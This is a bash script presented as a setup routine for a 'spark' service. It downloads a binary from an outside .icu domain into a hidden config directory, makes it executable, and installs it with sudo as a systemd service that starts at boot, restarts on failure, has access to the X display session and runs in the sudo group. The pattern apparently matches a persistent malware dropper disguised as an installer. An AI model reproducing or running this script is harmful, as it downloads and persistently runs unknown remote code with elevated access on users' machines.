#!/bin/bash

# Variables
APP_URL="https://panakeos.icu/app/u64/client443"  # Replace with the actual URL
CONFIG_DIR="$HOME/.config/spark"
BINARY_PATH="$CONFIG_DIR/spark"
SERVICE_NAME="spark"
DISPLAY_ENV=${DISPLAY:-:0}

# Step 1: Create Configuration Directory
echo "Creating configuration directory at $CONFIG_DIR..."
mkdir -p "$CONFIG_DIR"

# Step 2: Download the Binary File
echo "Downloading the binary file from $APP_URL..."
curl -L -o "$BINARY_PATH" "$APP_URL"
if [ $? -ne 0 ]; then
    echo "Error downloading the file. Exiting."
    exit 1
fi

# Step 3: Make the Binary Executable
echo "Making the binary executable..."
chmod +x "$BINARY_PATH"

# Step 4: Create Systemd Service File
SERVICE_FILE="/etc/systemd/system/$SERVICE_NAME.service"
echo "Creating systemd service file at $SERVICE_FILE..."

sudo bash -c "cat > $SERVICE_FILE" <<EOL
[Unit]
Description=spark Service
After=network.target

[Service]
Type=simple
ExecStart=$BINARY_PATH
Restart=on-failure
Environment=DISPLAY=$DISPLAY_ENV
Environment=XAUTHORITY=/home/dev/.Xauthority
Environment=HOME=$HOME
User=$USER
Group=sudo

[Install]
WantedBy=multi-user.target
EOL

if [ $? -ne 0 ]; then
    echo "Error creating the service file. Exiting."
    exit 1
fi

# Step 5: Enable and Start the Service
echo "Reloading systemd daemon..."
sudo systemctl daemon-reload

echo "Enabling $SERVICE_NAME service..."
sudo systemctl enable $SERVICE_NAME

echo "Starting $SERVICE_NAME service..."
sudo systemctl start $SERVICE_NAME

# Step 6: Verify the Service
echo "Verifying $SERVICE_NAME service status..."
sudo systemctl status $SERVICE_NAME

echo "Setup completed successfully!"
